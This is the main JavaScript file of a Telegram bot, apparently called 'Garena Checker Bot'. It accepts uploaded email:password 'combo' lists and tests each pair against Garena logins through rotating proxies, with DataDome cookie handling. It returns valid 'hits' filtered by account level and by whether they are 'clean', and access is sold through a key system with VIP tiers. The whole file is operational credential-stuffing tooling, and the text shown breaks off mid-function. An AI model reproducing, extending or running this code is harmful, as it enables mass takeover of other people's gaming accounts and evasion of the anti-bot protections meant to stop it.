/**
 * index.js — Main entry point: signal handling, polling, watchdog, heartbeat,
 *            bot command routing, callback query handling, checker runner,
 *            KeySystemAPI integration, auto-fetch proxy, persistent storage,
 *            setup wizard, liveness tracking, no-proxy notification,
 *            proxy-paused users auto-resume
 * Ported from Python main.py (the entire bot flow)
 */
const fs        = require('fs');
const path      = require('path');
const axios     = require('axios');

// ── Load config ────────────────────────────────────────────────────────
const config = require('./config');
config.ensureDirs();
const cfg = config.loadConfig();

// ── Handle missing config: setup wizard or wait loop ───────────────────
// If no config.json and no env vars, we need to either:
//   1. Run setup wizard (interactive / TTY mode)
//   2. Wait for env vars (Railway / cloud mode)
// This is handled below in main() after all imports are ready.

// ── Module imports ─────────────────────────────────────────────────────
const { createSession, applyck, getDatadomeCookie, prelogin, login,
        checkCodmAccount, parseAccountDetails, processaccount,
        updateSessionProxy, backoff } = require('./garena');
const { tgApi, tgSend, tgSendButtons, tgAnswerCallback, tgEditMessage,
        tgDeleteMessage, tgDeleteMessagesBulk, tgSendDocument,
        tgGetFileUrl, tgDownloadFile, tgSetCommands, sendResultsZip } = require('./telegram-api');
const { loadKeys, loadKeysAsync, saveKeys, genKey, genLocalKey, parseDuration, durLabel,
        createKey, redeemKey, checkAccess, deleteKeyFromApi,
        KeySystemAPI, getKeySystemAPI, resetKeySystemAPI } = require('./key-system');
const { botState, userData, savedUsers, stopEvents, activeBars,
        genkeyWizard, deleteKeySelection,
        proxyAccumulator, proxyMsgIds,
        loadSavedUsers, saveUsersToDisk, udata,
        getSavedProfile, saveProfile,
        getStopEvent, setStopEvent, isStopRequested, clearStopEvent, getAllStopEvents,
        setActiveBar, getActiveBar, removeActiveBar } = require('./session');
const { isGarenaCredential, parseComboLines, removeDuplicates } = require('./combo-parser');
const { normalizeProxyLine, preprocessProxyText, saveProxiesFromLines,
        uniqueProxyPath, flushProxyAccumulator,
        persistProxies, restoreAllProxies } = require('./proxy-upload');
const { startProxyFetcher } = require('./proxy-fetcher');
const GeoRotator     = require('./geo-rotator');
const CookieManager  = require('./cookie-manager');
const DataDomeManager = require('./datadome-manager');
const LiveStats      = require('./live-stats');
const { startHealthcheckServer, stopHealthcheckServer } = require('./healthcheck');

// ── Global instances ───────────────────────────────────────────────────
const geoRotator     = new GeoRotator();
const cookieManager  = new CookieManager();
const datadomeManager = new DataDomeManager();

// ── Thread / concurrency management ────────────────────────────────────
const MAX_GLOBAL_THREADS   = config.MAX_GLOBAL_THREADS;
const MAX_THREADS_PER_USER = config.MAX_THREADS_PER_USER;
const MAX_CONCURRENT_USERS = config.MAX_CONCURRENT_USERS;
const VIP_THREADS_PER_USER = config.VIP_THREADS_PER_USER;

// Simple async semaphore
class AsyncSemaphore {
  constructor(max) {
    this.max = max;
    this.current = 0;
    this.queue = [];
  }
  async acquire() {
    if (this.current < this.max) {
      this.current++;
      return;
    }
    return new Promise(resolve => this.queue.push(resolve));
  }
  release() {
    this.current--;
    if (this.queue.length > 0) {
      this.current++;
      const next = this.queue.shift();
      next();
    }
  }
  get value() { return this.max - this.current; }
}

const globalSem = new AsyncSemaphore(MAX_GLOBAL_THREADS);
const userSlotSem = new AsyncSemaphore(MAX_CONCURRENT_USERS);

// ── Liveness tracking ──────────────────────────────────────────────────
let _livenessTs = Date.now();
function touchLiveness() {
  _livenessTs = Date.now();
}
function getLivenessAge() {
  return (Date.now() - _livenessTs) / 1000;
}

// ── No-proxy notification ──────────────────────────────────────────────
let _noProxyWarned = false;

function notifyNoProxy(token, chatId = null) {
  // Re-check pool right before sending — avoid race condition
  if (geoRotator.hasProxies()) {
    clearNoProxyWarning();
    return;
  }
  if (_noProxyWarned) return;
  _noProxyWarned = true;

  const now = new Date().toISOString().replace('T', ' ').slice(0, 19);
  const poolSize = geoRotator.total;
  try {
    tgSend(token, config.getOwnerId(),
      `⚠️ <b>No Proxies Available!</b>\n\n` +
      `⏱ <b>Time:</b> ${now}\n` +
      `📡 <b>Proxy Pool:</b> ${poolSize} proxies\n` +
      `🔧 <b>Action:</b> Upload proxy files to the proxy/ folder\n\n` +
      `<i>Bot is in maintenance mode for non-owner users.</i>`
    );
  } catch { /* ignore */ }
}

function clearNoProxyWarning() {
  _noProxyWarned = false;
}

// ── Proxy-paused users: auto-resume when proxies become available ──────
const _proxyPausedUsers = {}; // chatId -> {combo_path, file_name, lines, user_data}

function registerProxyPaused(chatId, comboPath, fileName, lines, userData) {
  _proxyPausedUsers[String(chatId)] = {
    chat_id: chatId,
    combo_path: comboPath,
    file_name: fileName,
    total_lines: lines.length,
    progress: 0,
    level: userData.level || [1],
    clean_filter: userData.clean_filter || 'both',
    hits_id: userData.hits_id || chatId,
    username: userData.username || '',
    combo_limit: userData.combo_limit || config.COMBO_LINE_LIMIT,
    paused_at: Date.now() / 1000,
  };
  console.log(`[BOT] Registered proxy-paused user: chat_id=${chatId}, file=${fileName}, lines=${lines.length}`);
}

function unregisterProxyPaused(chatId) {
  delete _proxyPausedUsers[String(chatId)];
}

function resumeProxyPausedUsers(token) {
  const paused = { ..._proxyPausedUsers };
  for (const key of Object.keys(_proxyPausedUsers)) {
    delete _proxyPausedUsers[key];
  }

  if (!Object.keys(paused).length) return;

  console.log(`[BOT] ✅ Proxies available! Resuming ${Object.keys(paused).length} paused user(s)...`);

  for (const [key, sess] of Object.entries(paused)) {
    const chatId = sess.chat_id;
    const fileName = sess.file_name || 'unknown.txt';

    tgSend(token, chatId,
      `✅ <b>Proxies are back — Auto-Resuming!</b>\n\n` +
      `📄 <b>File:</b> <code>${fileName}</code>\n` +
      `📊 <b>Remaining:</b> ${sess.total_lines} accounts\n\n` +
      `<i>Please re-upload your combo file to start checking again.</i>`
    );
  }
}

// ── Broadcast accumulator ──────────────────────────────────────────────
const _broadcastAccumulator = {}; // chatId -> [textLine, ...]

// ── Print banner ───────────────────────────────────────────────────────
function printBanner() {
  console.log(`
╔══════════════════════════════════════════════════════════╗
║           🤖 Garena Checker Bot — Node.js               ║
║           CONFIG BY: @Yukiii_ii                         ║
╚══════════════════════════════════════════════════════════╝
  `);
}

// ── Cleanup stale files ────────────────────────────────────────────────
function cleanupStaleFiles() {
  const dataDir = config.DATA_DIR;
  if (!fs.existsSync(dataDir)) return;
  const files = fs.readdirSync(dataDir);
  for (const f of files) {
    if (f.startsWith('combo_') && f.endsWith('.txt')) {
      const fp = path.join(dataDir, f);
      try {
        const stat = fs.statSync(fp);
        if (Date.now() - stat.mtimeMs > 3600000) {
          fs.unlinkSync(fp);
        }
      } catch {}
    }
  }
}

// ── Find nearest account file ──────────────────────────────────────────
function findNearestAccountFile(resultFolder) {
  if (!fs.existsSync(resultFolder)) return null;
  const files = fs.readdirSync(resultFolder);
  for (const name of ['full_details.txt', 'clean.txt', 'notclean.txt']) {
    if (files.includes(name)) return path.join(resultFolder, name);
  }
  return null;
}

// ── Owner check helpers ────────────────────────────────────────────────
function isOwner(fromUser) {
  return config.isOwner(fromUser);
}

function isPrimaryOwner(fromUser) {
  return config.isPrimaryOwner(fromUser);
}

// ── Handle /start ──────────────────────────────────────────────────────
function handleStart(token, chatId, fromUser) {
  const tgId   = fromUser?.id || chatId;
  const uname  = fromUser?.username || '';

  const d = udata(chatId);
  d.hits_id = tgId;
  if (uname) d.username = uname;

  tgSendButtons(token, chatId,
    `👋 <b>Welcome to Garena Checker!</b>\n\n` +
    `🔑 Your ID: <code>${tgId}</code>\n` +
    (uname ? `👤 Username: @${uname}\n` : '') +
    `\n━━━━━━━━━━━━━━━━━━━━━━━━\n` +
    `Choose your preferred level:`,
    [
      [
        { text: '💯 Level 100+', callback_data: 'lvl:100' },
        { text: '🇲🇽 Level 200+', callback_data: 'lvl:200' },
      ],
      [
        { text: '🔥 Level 300+', callback_data: 'lvl:300' },
        { text: '💎 Level 400+', callback_data: 'lvl:400' },
      ],
      [
        { text: '🌐 ALL levels', callback_data: 'lvl:all' },
      ],
    ]
  );
}

// ── Ask level (text fallback) ──────────────────────────────────────────
function askLevel(token, chatId) {
  tgSend(token, chatId,
    '🎯 <b>Choose your level filter:</b>\n\n' +
    'Tap a button below or type: <code>100</code>, <code>200</code>, <code>300</code>, <code>400</code>, or <code>all</code>',
    {
      reply_markup: JSON.stringify({
        inline_keyboard: [
          [
            { text: '💯 Level 100+', callback_data: 'lvl:100' },
            { text: '🇲🇽 Level 200+', callback_data: 'lvl:200' },
          ],
          [
            { text: '🔥 Level 300+', callback_data: 'lvl:300' },
            { text: '💎 Level 400+', callback_data: 'lvl:400' },
          ],
          [
            { text: '🌐 ALL levels', callback_data: 'lvl:all' },
          ],
        ]
      })
    }
  );
}

// ── Ask filter ─────────────────────────────────────────────────────────
function askFilter(token, chatId, levelLabel) {
  tgSendButtons(token, chatId,
    `🔍 <b>Level: ${levelLabel}</b>\n\nWhat type of hits do you want?`,
    [
      [
        { text: '✅ CLEAN only', callback_data: 'flt:clean' },
        { text: '❌ NOT CLEAN only', callback_data: 'flt:notclean' },
      ],
      [
        { text: '🔄 BOTH', callback_data: 'flt:both' },
      ],
    ]
  );
}

// ── Handle level input ─────────────────────────────────────────────────
function handleLevel(token, chatId, text) {
  const levelMap = {
    '100': ([100], 'Level 100+'),
    '200': ([200], 'Level 200+'),
    '300': ([300], 'Level 300+'),
    '400': ([400], 'Level 400+'),
    'all': ([1],   'ALL levels'),
  };
  const key = text.trim().toLowerCase();
  if (!levelMap[key]) {
    askLevel(token, chatId);
    return;
  }
  const [thresholds, label] = levelMap[key];
  const d = udata(chatId);
  d.level = thresholds;
  askFilter(token, chatId, label);
}

// ── Handle filter input ────────────────────────────────────────────────
function handleFilter(token, chatId, text) {
  const filterMap = {
    'clean':    ('clean',    '✅ CLEAN only'),
    'notclean': ('notclean', '❌ NOT CLEAN only'),
    'both':     ('both',     '🔄 BOTH'),
  };
  const key = text.trim().toLowerCase();
  if (!filterMap[key]) {
    const d = udata(chatId);
    const lvlLabel = d.level?.[0] === 1 ? 'ALL levels' : `Level ${d.level?.[0]}+`;
    askFilter(token, chatId, lvlLabel);
    return;
  }
  const [cfValue, cfLabel] = filterMap[key];
  const d = udata(chatId);
  d.clean_filter = cfValue;
  botState[chatId] = 'AWAIT_FILE';
  saveProfile(chatId, d);

  const lvlLabel  = d.level?.[0] === 1 ? 'ALL levels' : `Level ${d.level?.[0]}+`;
  const userLimit = d.combo_limit || config.COMBO_LINE_LIMIT;

  tgSend(token, chatId,
    `✅ <b>Config saved!</b>\n\n` +
    `━━━━━━━━━━━━━━━━━━━━━━━━\n` +
    `  🔑 Hits ID:  <code>${d.hits_id || chatId}</code>\n` +
    `  🎮 Level:    <code>${lvlLabel}</code>\n` +
    `  🔍 Hit type: <code>${cfLabel}</code>\n` +
    `  📦 Limit:    <code>${userLimit} lines</code>\n` +
    `━━━━━━━━━━━━━━━━━━━━━━━━\n\n` +
    `📂 <b>Upload your combo file to start!</b>\n\n` +
    `<i>Use /reset to change settings.</i>\n\n` +
    `<i>Send your file now ⬇️</i>`
  );
}

// ── Check access gate ──────────────────────────────────────────────────
function checkAccessGate(token, chatId, fromUser) {
  const uid = fromUser?.id || chatId;
  if (isOwner(fromUser)) return true;

  const access = checkAccess(uid, savedUsers);
  if (access.allowed) return true;

  if (access.reason === 'expired') {
    tgSend(token, chatId,
      '⏰ <b>Your key has expired!</b>\n\n' +
      'Contact the owner to get a new key.\n' +
      'Use /redeem to enter a new key.');
  } else {
    tgSend(token, chatId,
      '🔐 <b>Access Denied</b>\n\n' +
      'You need a key to use this bot.\n\n' +
      'Use /redeem to enter your key.\n' +
      '<i>Contact the owner to get a key.</i>',
      {
        reply_markup: JSON.stringify({
          inline_keyboard: [
            [{ text: '🔑 Redeem Key', callback_data: 'redeem:prompt' }],
          ]
        })
      }
    );
  }
  return false;
}

// ── Handle file upload & start checker ─────────────────────────────────
async function handleFile(token, chatId, msg, fromUser) {
  const doc = msg.document;
  if (!doc) {
    tgSend(token, chatId, '📂 Please upload a combo file.');
    return;
  }

  const filename = (doc.file_name || '').toLowerCase();
  if (!filename.includes('garena') && !filename.includes('codm')) {
    tgSend(token, chatId,
      '❌ <b>Invalid file name!</b>\n\n' +
      'File name must contain <code>garena</code> or <code>codm</code>\n' +
      '(e.g. <code>garena.txt</code>, <code>codm.txt</code>, <code>Yuki_garena.txt</code>)');
    return;
  }

  // Check if proxies are available before starting
  if (!geoRotator.hasProxies()) {
    notifyNoProxy(token, chatId);
    tgSend(token, chatId,
      '⚠️ <b>No proxies available!</b>\n\n' +
      'The bot cannot check accounts without proxies.\n' +
      'Your check will auto-resume when proxies are available.\n\n' +
      '<i>Contact the owner to upload proxies.</i>'
    );
    // Register for auto-resume
    const d = udata(chatId);
    registerProxyPaused(chatId, '', doc.file_name, [], d);
    return;
  }

  const d = udata(chatId);
  const tgId = d.hits_id || fromUser?.id || chatId;
  const userLimit = d.combo_limit || config.COMBO_LINE_LIMIT;

  // Download file
  const fileId = doc.file_id;
  const comboDir = path.join(config.DATA_DIR, 'combos');
  fs.mkdirSync(comboDir, { recursive: true });
  const comboPath = path.join(comboDir, `combo_${chatId}_${Date.now()}.txt`);

  const statusMsg = await tgSend(token, chatId, '⬇️ <b>Downloading combo file...</b>');

  const downloadResult = await tgDownloadFile(token, fileId, comboPath);
  if (!downloadResult) {
    tgSend(token, chatId, '❌ <b>Failed to download file.</b> Please try again.');
    return;
  }

  // Parse combos
  const content = fs.readFileSync(comboPath, 'utf-8');
  let combos = parseComboLines(content);
  combos = removeDuplicates(combos);

  if (!combos.length) {
    tgSend(token, chatId, '❌ <b>No valid combos found in file.</b>\n\nMake sure format is <code>email:password</code>');
    try { fs.unlinkSync(comboPath); } catch {}
    return;
  }

  if (combos.length > userLimit) {
    combos = combos.slice(0, userLimit);
  }

  const total = combos.length;

  // Create result folder
  const resultFolder = path.join(config.RESULTS_DIR, `result_${chatId}_${Date.now()}`);
  fs.mkdirSync(resultFolder, { recursive: true });

  // Set state to running
  botState[chatId] = 'RUNNING';
  const stopEvt = getStopEvent(chatId);
  stopEvt.clear();

  // Create LiveStats
  const liveStats = new LiveStats(total, d.level || [1], d.clean_filter || 'both');

  // Build telegram config
  const telegramConfig = [
    token,
    tgId,
    d.level || [1],
    '',
    d.clean_filter || 'both',
  ];

  tgSend(token, chatId,
    `🚀 <b>Checker started!</b>\n\n` +
    `📂 File: <code>${doc.file_name}</code>\n` +
    `📊 Total: <code>${total}</code> combos\n` +
    `🎮 Level: <code>${d.level?.[0] === 1 ? 'ALL' : d.level?.[0] + '+'}</code>\n` +
    `🔍 Filter: <code>${d.clean_filter || 'both'}</code>\n\n` +
    `Use /stop to cancel.`
  );

  clearNoProxyWarning();

  // ── Run checker in background ────────────────────────────────────────
  (async () => {
    await userSlotSem.acquire();
    let done = 0;

    // Progress updater
    const progressInterval = setInterval(async () => {
      try {
        setActiveBar(chatId, { done, total, live_stats: liveStats });
      } catch {}
    }, 5000);

    // Progress message updater (Telegram)
    let progressMsgId = null;
    const progressTgInterval = setInterval(async () => {
      try {
        const pct = total > 0 ? (done / total * 100).toFixed(1) : '0.0';
        const fancyProgress = liveStats.getFancyTelegramProgress();
        const text =
          `📊 <b>Progress:</b> <code>${done}/${total}</code> (${pct}%)\n\n${fancyProgress}`;

        if (!progressMsgId) {
          const result = await tgSend(token, chatId, text);
          if (result?.ok && result?.result?.message_id) {
            progressMsgId = result.result.message_id;
          }
        } else {
          await tgEditMessage(token, chatId, progressMsgId, text, []);
        }
      } catch {}
    }, 15000);

    // Process combos with concurrency control via semaphores
    const threadsPerUser = isOwner(fromUser) ? VIP_THREADS_PER_USER : MAX_THREADS_PER_USER;
    const userSem = new AsyncSemaphore(threadsPerUser);

    async function processCombo([account, password]) {
      if (stopEvt.isSet() || config.shutdownEvent.isSet()) return;

      await globalSem.acquire();
      await userSem.acquire();

      let session;
      try {
        const proxyUrl = geoRotator.getCurrentProxy();

        // If no proxy available mid-check, notify and pause
        if (!proxyUrl && !geoRotator.hasProxies()) {
          notifyNoProxy(token);
        }

        session = createSession(proxyUrl);

        await processaccount(
          session, account, password,
          cookieManager, datadomeManager,
          liveStats, geoRotator,
          resultFolder, telegramConfig,
          tgSend
        );

        touchLiveness();
      } catch (e) {
        console.error(`[CHECKER] Error processing ${account}:`, e.message);
        liveStats.recordError();
      } finally {
        done++;
        if (session) {
          session.defaults._cookies = {};
          session.interceptors.request.handlers = [];
          session.interceptors.response.handlers = [];
        }
        session = null;
        globalSem.release();
        userSem.release();
      }
    }

    // Process in small chunks to avoid memory spike
    const CHUNK_SIZE = threadsPerUser * 2;
    for (let i = 0; i < combos.length; i += CHUNK_SIZE) {
      if (stopEvt.isSet() || config.shutdownEvent.isSet()) break;
      const chunk = combos.slice(i, i + CHUNK_SIZE);
      await Promise.all(chunk.map(c => processCombo(c)));
      if (global.gc) global.gc();
    }

    clearInterval(progressInterval);
    clearInterval(progressTgInterval);

    const finalStats = liveStats.getFancyTelegramProgress();
    await tgSend(token, chatId, `✅ <b>Checker Complete!</b>\n\n${finalStats}`);

    // Send results
    if (fs.existsSync(resultFolder)) {
      const hasFiles = fs.readdirSync(resultFolder).some(f =>
        f.endsWith('.txt') || f.endsWith('.zip')
      );
      if (hasFiles) {
        const allItems = fs.readdirSync(resultFolder, { recursive: true });
        const txtFiles = allItems.filter(f => String(f).endsWith('.txt'));
        if (txtFiles.length > 0) {
          await sendResultsZip(token, chatId, resultFolder);
        }
      }
    }

    botState[chatId] = 'AWAIT_FILE';
    try { fs.unlinkSync(comboPath); } catch {}
    userSlotSem.release();

  })().catch(e => {
    console.error('[CHECKER] Fatal error:', e);
    botState[chatId] = 'AWAIT_FILE';
    userSlotSem.release();
  });
}

// ── Handle help (owner menu with inline buttons) ───────────────────────
function handleHelp(token, chatId, fromUser) {
  if (!isOwner(fromUser)) {
    tgSend(token, chatId,
      '📋 <b>User Commands:</b>\n\n' +
      '/start — Start / configure\n' +
      '/help — Show this help\n' +
      '/stop — Stop your checker\n' +
      '/reset — Reset settings\n' +
      '/redeem — Redeem a key'
    );
    return;
  }

  tgSendButtons(token, chatId,
    '👑 <b>Owner Panel</b>\n\nSelect an action:',
    [
      [
        { text: '🔑 Generate Key', callback_data: 'admin:genkey' },
        { text: '📊 Key Status', callback_data: 'admin:statuskey' },
      ],
      [
        { text: '🗑 Delete Keys', callback_data: 'admin:deletekey_menu' },
        { text: '🖥 Server Status', callback_data: 'admin:serverstatus' },
      ],
      [
        { text: '📡 Proxy Status', callback_data: 'admin:proxystatus' },
        { text: '📤 Upload Proxy', callback_data: 'admin:upload_proxy' },
      ],
      [
        { text: '🔗 KeyVault Config', callback_data: 'admin:keysystem' },
        { text: '🔄 Refresh', callback_data: 'admin:refresh' },
      ],
    ]
  );
}

// ── Handle server status ───────────────────────────────────────────────
function handleServerStatus(token, chatId) {
  const mem = process.memoryUsage();
  const rss = Math.round(mem.rss / 1024 / 1024);
  const heapUsed = Math.round(mem.heapUsed / 1024 / 1024);
  const heapTotal = Math.round(mem.heapTotal / 1024 / 1024);
  const livenessAge = Math.round(getLivenessAge());

  const activeCheckers = Object.values(botState).filter(s => s === 'RUNNING').length;
  const totalProxies = geoRotator.total;
  const currentProxy = geoRotator.currentProxy || 'None';
  const pausedUsers = Object.keys(_proxyPausedUsers).length;

  // KeyVault status
  const api = getKeySystemAPI();
  const keysystemStatus = api.enabled ? '✅ Connected' : '❌ Not configured';

  tgSend(token, chatId,
    `🖥 <b>Server Status</b>\n\n` +
    `━━━━━━━━━━━━━━━━━━━━━━━━\n` +
    `💾 Memory: <b>${rss}MB</b> RSS / <b>${heapUsed}MB</b> / <b>${heapTotal}MB</b>\n` +
    `🔄 Active Checkers: <b>${activeCheckers}</b>\n` +
    `🌐 Proxy: <code>${currentProxy}</code>\n` +
    `📡 Total Proxies: <b>${totalProxies}</b>\n` +
    `⏸ Paused Users: <b>${pausedUsers}</b>\n` +
    `🧵 Max Threads: <b>${MAX_GLOBAL_THREADS}</b>\n` +
    `⏱ Uptime: <b>${Math.floor(process.uptime())}s</b>\n` +
    `💓 Liveness: <b>${livenessAge}s ago</b>\n` +
    `🔗 KeyVault: <b>${keysystemStatus}</b>\n` +
    `━━━━━━━━━━━━━━━━━━━━━━━━`
  );
}

// ── Handle proxy status ────────────────────────────────────────────────
function handleProxyStatus(token, chatId) {
  const proxyFiles = config.getProxyFiles();
  const total = geoRotator.total;
  const current = geoRotator.currentProxy || 'None';
  const blocked = geoRotator.blockedSet.size;
  const available = geoRotator.getProxies().length;

  let filesInfo = 'None';
  if (proxyFiles.length) {
    filesInfo = proxyFiles.map(fp => {
      const name = path.basename(fp);
      try {
        const count = fs.readFileSync(fp, 'utf-8').split('\n').filter(l => l.trim()).length;
        return `${name} (${count})`;
      } catch { return name; }
    }).join('\n');
  }

  tgSend(token, chatId,
    `📡 <b>Proxy Status</b>\n\n` +
    `━━━━━━━━━━━━━━━━━━━━━━━━\n` +
    `🌐 Current: <code>${current}</code>\n` +
    `📊 Total: <b>${total}</b>\n` +
    `✅ Available: <b>${available}</b>\n` +
    `🚫 Blocked: <b>${blocked}</b>\n` +
    `📂 Files:\n<code>${filesInfo}</code>\n` +
    `━━━━━━━━━━━━━━━━━━━━━━━━`
  );
}

// ── Key status handler ──────────────────────────────────────────────────
async function handleStatusKey(token, chatId, keyArg) {
  const keys = await loadKeysAsync();
  const keyList = Object.entries(keys);

  if (!keyList.length) {
    tgSend(token, chatId, '📋 <b>No keys found.</b>');
    return;
  }

  const now = Date.now() / 1000;

  // ── Specific key requested → show rich details ──
  if (keyArg && keyArg.trim()) {
    const target = keyArg.trim().toUpperCase();
    const entry = keys[target];
    if (!entry) {
      // try case-insensitive
      const lower = keyArg.trim().toLowerCase();
      for (const [k, v] of Object.entries(keys)) {
        if (k.toLowerCase() === lower) {
          handleStatusKeyDetail(token, chatId, k, v, now);
          return;
        }
      }
      tgSend(token, chatId, `❌ Key <code>${target}</code> not found.`);
      return;
    }
    handleStatusKeyDetail(token, chatId, target, entry, now);
    return;
  }

  // ── Dashboard summary ──
  const active  = keyList.filter(([k, v]) => now < (v.expires || 0) && !v.revoked);
  const expired = keyList.filter(([k, v]) => now >= (v.expires || 0) && !v.revoked);
  const revoked = keyList.filter(([k, v]) => v.revoked);

  function usedCount(v) {
    const ub = v.used_by;
    if (!ub) return 0;
    if (typeof ub === 'string') return ub ? 1 : 0;
    if (Array.isArray(ub)) return ub.length;
    return 0;
  }

  const lines = [];
  lines.push('📋 <b>Key Status — Dashboard</b>');
  lines.push('━━━━━━━━━━━━━━━━━━━━━━━━━━');
  lines.push(`🔢 <b>Total:</b> ${keyList.length}  |  ✅ Active: ${active.length}  |  ❌ Expired: ${expired.length}  |  🚫 Revoked: ${revoked.length}`);
  lines.push('━━━━━━━━━━━━━━━━━━━━━━━━━━');

  if (active.length) {
    lines.push('✅ <b>Active Keys:</b>');
    for (const [k, v] of active.slice(0, 10)) {
      const rem = Math.max(0, Math.floor((v.expires || 0) - now));
      const usedCnt = usedCount(v);
      const maxU = v.max_users || 1;
      const redeems = `${usedCnt}/${maxU === 0 ? '∞' : maxU}`;
      const combo = v.combo_limit === 0 ? '∞' : String(v.combo_limit || 1000);
      const tierBadge = v.tier === 'vip' ? '⭐' : '🆓';
      const label = v.label ? ` · ${v.label}` : '';

      // Build user list for this key
      const keyUsers = [];
      let ub = v.used_by || [];
      if (typeof ub === 'string') ub = ub ? [ub] : [];
      for (const u of ub) {
        if (typeof u === 'object') {
          const un = u.username || '';
          const nm = u.name || '';
          const uid = u.id || u.tg_id || '';
          let uCid;
          try { uCid = parseInt(uid); } catch { uCid = null; }
          const isOn = uCid && botState[uCid] && ['RUNNING', 'AWAIT_FILE', 'AWAIT_LEVEL', 'AWAIT_FILTER'].includes(botState[uCid]);
          const badge = isOn ? '🟢' : '⚫';
          keyUsers.push(`${badge} ${un ? '@' + un : nm || uid}`);
        } else {
          const prof = getSavedProfile(String(u));
          const pn = prof?.username || '';
          let uCid;
          try { uCid = parseInt(u); } catch { uCid = null; }
          const isOn = uCid && botState[uCid] && ['RUNNING', 'AWAIT_FILE', 'AWAIT_LEVEL', 'AWAIT_FILTER'].includes(botState[uCid]);
          const badge = isOn ? '🟢' : '⚫';
          keyUsers.push(`${badge} ${pn ? '@' + pn : u}`);
        }
      }
      const usersStr = keyUsers.length ? keyUsers.join(' · ') : '';
      const usersLine = usersStr ? `\n  👤 ${usersStr}` : '';
      lines.push(`  ${tierBadge} <code>${k.slice(0, 20)}${k.length > 20 ? '…' : ''}</code>${label}`);
      lines.push(`  ⏳ ${durLabel(rem)} · 👥 ${redeems} · 📦 ${combo}${usersLine}`);
    }
    if (active.length > 10) {
      lines.push(`  <i>...and ${active.length - 10} more</i>`);
    }
  }

  if (expired.length) {
    lines.push('');
    lines.push('❌ <b>Expired Keys:</b>');
    for (const [k, v] of expired.slice(0, 5)) {
      const usedCnt = usedCount(v);
      const maxU = v.max_users || 1;
      const redeems = `${usedCnt}/${maxU === 0 ? '∞' : maxU}`;
      const tierBadge = v.tier === 'vip' ? '⭐' : '🆓';
      lines.push(`  ${tierBadge} <code>${k.slice(0, 20)}${k.length > 20 ? '…' : ''}</code> — 👥 ${redeems}`);
    }
    if (expired.length > 5) {
      lines.push(`  <i>...and ${expired.length - 5} more</i>`);
    }
  }

  if (revoked.length) {
    lines.push('');
    lines.push('🚫 <b>Revoked Keys:</b>');
    for (const [k, v] of revoked.slice(0, 5)) {
      const tierBadge = v.tier === 'vip' ? '⭐' : '🆓';
      lines.push(`  ${tierBadge} <code>${k.slice(0, 20)}${k.length > 20 ? '…' : ''}</code>`);
    }
    if (revoked.length > 5) {
      lines.push(`  <i>...and ${revoked.length - 5} more</i>`);
    }
  }

  // ── Active Users Overview ──
  const allKeyUsers = [];
  for (const [k, v] of keyList) {
    let ub = v.used_by || [];
    if (typeof ub === 'string') ub = ub ? [ub] : [];
    for (const u of ub) {
      if (typeof u === 'object') {
        const uid = u.id || u.tg_id || '';
        let uCid;
        try { uCid = parseInt(uid); } catch { uCid = null; }
        const isOn = uCid && botState[uCid] && ['RUNNING', 'AWAIT_FILE', 'AWAIT_LEVEL', 'AWAIT_FILTER'].includes(botState[uCid]);
        allKeyUsers.push({ name: u.name || '', username: u.username || '', id: uid, isOn });
      } else {
        const prof = getSavedProfile(String(u));
        const pn = prof?.username || '';
        let uCid;
        try { uCid = parseInt(u); } catch { uCid = null; }
        const isOn = uCid && botState[uCid] && ['RUNNING', 'AWAIT_FILE', 'AWAIT_LEVEL', 'AWAIT_FILTER'].includes(botState[uCid]);
        allKeyUsers.push({ name: pn, username: pn, id: String(u), isOn });
      }
    }
  }
  if (allKeyUsers.length) {
    const onlineCount = allKeyUsers.filter(u => u.isOn).length;
    const totalCount = allKeyUsers.length;
    lines.push('');
    lines.push(`👥 <b>Key Users:</b> ${onlineCount}/${totalCount} online`);
    for (const u of allKeyUsers.slice(0, 15)) {
      const badge = u.isOn ? '🟢' : '⚫';
      const status = u.isOn ? '1/1' : '0/1';
      const namePart = u.username ? '@' + u.username : u.name || String(u.id);
      lines.push(`  ${badge} ${namePart} ─ <code>${u.id}</code> [${status}]`);
    }
    if (allKeyUsers.length > 15) {
      lines.push(`  <i>...and ${allKeyUsers.length - 15} more</i>`);
    }
  }

  lines.push('');
  lines.push('<i>Use /statuskey KEY for details · /deletekey to remove</i>');

  const fullText = lines.join('\n');

  // Chunk if too long
  if (fullText.length > 4000) {
    const chunks = [];
    let current = '';
    for (const line of lines) {
      if (current.length + line.length + 1 > 3800) {
        chunks.push(current);
        current = '';
      }
      current += (current ? '\n' : '') + line;
    }
    if (current) chunks.push(current);
    for (const chunk of chunks) tgSend(token, chatId, chunk);
  } else {
    tgSend(token, chatId, fullText);
  }
}

function handleStatusKeyDetail(token, chatId, target, entry, now) {
  const expired = now >= (entry.expires || 0);
  const status = expired ? '❌ Expired' : '✅ Active';
  let usedBy = entry.used_by || [];
  if (typeof usedBy === 'string') usedBy = usedBy ? [usedBy] : [];

  const maxUsers = entry.max_users || 1;
  const slotsUsed = usedBy.length;
  const slotsMax = maxUsers === 0 ? '∞' : String(maxUsers);
  const comboDisp = entry.combo_limit === 0 ? '∞ Unlimited' : `${entry.combo_limit || 500} lines`;
  const created = new Date((entry.created || 0) * 1000).toISOString().slice(0, 16).replace('T', ' ');
  const expDt = new Date((entry.expires || 0) * 1000).toISOString().slice(0, 16).replace('T', ' ');
  const tierDisp = entry.tier === 'vip' ? '⭐ VIP' : '🆓 Free';
  const labelDisp = entry.label || '(none)';
  const fmtDisp = (entry.format || 'unknown').toUpperCase();
  const source = entry.source || 'local';

  // Build rich user list
  const usersLines = [];
  for (const u of usedBy) {
    if (typeof u === 'object') {
      const uName = u.name || '';
      const uUser = u.username || '';
      const uId = u.id || u.tg_id || '';
      let uCid;
      try { uCid = parseInt(uId); } catch { uCid = null; }
      const isOn = uCid && botState[uCid] && ['RUNNING', 'AWAIT_FILE', 'AWAIT_LEVEL', 'AWAIT_FILTER'].includes(botState[uCid]);
      const activeBadge = isOn ? '🟢 1/1' : '⚫ 0/1';
      const usernamePart = uUser ? '@' + uUser : uName || String(uId);
      let display = `    • <code>${target.slice(0, 8)}-${usernamePart}</code>`;
      display += ` ─ ${uName}`;
      if (uUser) display += ` @${uUser}`;
      display += ` ─ <code>${uId}</code> ${activeBadge}`;
      usersLines.push(display);
    } else {
      let uCid;
      try { uCid = parseInt(u); } catch { uCid = null; }
      const isOn = uCid && botState[uCid] && ['RUNNING', 'AWAIT_FILE', 'AWAIT_LEVEL', 'AWAIT_FILTER'].includes(botState[uCid]);
      const activeBadge = isOn ? '🟢 1/1' : '⚫ 0/1';
      const prof = getSavedProfile(String(u));
      const pName = prof?.username || '';
